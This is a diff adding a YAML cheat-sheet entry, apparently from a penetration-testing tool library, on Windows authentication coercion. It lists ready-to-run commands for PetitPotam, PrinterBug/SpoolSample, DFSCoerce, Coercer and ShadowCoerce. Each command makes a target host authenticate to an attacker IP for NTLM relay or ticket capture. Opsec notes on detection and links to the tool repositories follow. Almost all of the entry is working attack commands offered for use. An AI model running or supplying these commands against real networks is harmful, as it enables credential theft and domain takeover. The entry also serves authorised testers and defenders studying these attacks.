@@ -1,0 +1,30 @@
+name: Coercion
+description: Authentication coercion techniques (PetitPotam, PrinterBug, etc.)
+commands:
+- '# Authentication coercion forces a target to authenticate to attacker-controlled server'
+- '# Commonly used with NTLM relay or to capture TGTs (unconstrained delegation)'
+- ''
+- '# PetitPotam (MS-EFSR - Encrypting File System Remote)'
+- python3 PetitPotam.py <ATTACKER_IP> <TARGET_HOST>
+- ''
+- '# PrinterBug / SpoolSample (MS-RPRN - Print System Remote)'
+- python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_HOST> <ATTACKER_IP>
+- SpoolSample.exe <TARGET_HOST> <ATTACKER_IP>
+- ''
+- '# DFSCoerce (MS-DFSNM - Distributed File System)'
+- python3 dfscoerce.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' <ATTACKER_IP> <TARGET_HOST>
+- ''
+- '# Coercer (all-in-one, multiple protocols)'
+- python3 Coercer.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -l <ATTACKER_IP> -t <TARGET_HOST>
+- python3 Coercer.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -l <ATTACKER_IP> -t <TARGET_HOST> --filter-method-name EfsRpcOpenFileRaw
+- ''
+- '# ShadowCoerce (MS-FSRVP - File Server Remote VSS)'
+- python3 shadowcoerce.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' <ATTACKER_IP> <TARGET_HOST>
+opsec:
+- Some coercion methods require authentication
+- Network traffic to attacker IP
+- Failed coercion attempts may be logged
+references:
+- https://github.com/topotam/PetitPotam
+- https://github.com/p0dalirius/Coercer
+- https://github.com/ShutdownRepo/ShadowCoerce
